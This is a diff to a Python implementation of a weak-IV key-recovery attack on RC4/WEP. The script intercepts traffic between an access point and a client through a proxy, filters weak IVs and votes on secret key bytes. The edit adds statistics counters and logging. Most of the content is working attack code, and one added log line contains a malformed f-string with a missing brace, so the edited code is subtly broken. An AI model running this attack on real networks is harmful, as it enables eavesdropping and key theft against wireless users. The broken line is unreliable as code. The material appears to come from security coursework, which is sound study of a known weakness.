@@ -8,6 +8,7 @@ class Attacker:
         self.data = data 
         self.snap_hdr = "AA"
         self.data_test = []
+        self.stats = {"total_samples" : 0, "iv_matches" : 0, "skipped" : 0}
     
 
     # swap two values by index in the state array / S-Box
@@ -44,6 +45,9 @@ class Attacker:
 
     # recover the secret key
     def recover_key(self):
+        # start statistics reporting
+        self.stats["total_samples"] = len(self.data)
+        log.info(f"{self.stats['total_samples'] available to analyze")
         key_len = 4
         session_key = [0] * 3
         # iterate A to the number of bytes we need to recover
@@ -53,6 +57,13 @@ class Attacker:
             for row in self.data:
                 # first 3 bytes of the key are the IV
                 session_key[:3] = row[:3]
+                # skip when IV_0 != A+3
+                if session_key[0] != A +3:
+                    self.stats["skipped"] += 1
+                    continue
+                # otherwise increment stat
+                self.stats["iv_matches"] += 1
+
                 # partial execution of the KSA
                 S, j, init_0, init_1 = self.partial_ksa(session_key, A)
                 z = S[1] # should be 0   
@@ -67,7 +78,11 @@ class Attacker:
                     key_byte = (ks_byte - j - S[A+3]) % 256 # inversion of the PRGA
                     prob_table[key_byte] += 1 # each byte has a frequency counter, increment if resolved condition met
             # get the byte with the highest probability counter - after all IVs have been iterated     
-            session_key.append(prob_table.index(max(prob_table)))         
+            session_key.append(prob_table.index(max(prob_table)))
+            log.info(f"Skipped {self.stats['skipped']} IVs")
+            log.info(f"{self.stats['iv_matches']} were of proper weak form")
+            self.stats["iv_matches"] = 0
+            self.stats["skipped"] = 0
 
         # format recovered key, remove IV from beginning
         self.format_key(session_key)
@@ -139,7 +154,7 @@ def main():
     utils = Utils(hosts)
     utils.start_proxy()
     log.info("Intercepting encrypted messages between access point and client")
-    log.info(f"Analyzing {len(utils.data)} IVs and CT[0] tuples")
+    #log.info(f"Analyzing {len(utils.data)} IVs and CT[0] tuples")
     attacker = Attacker(utils.data)
     attacker.recover_key()
 
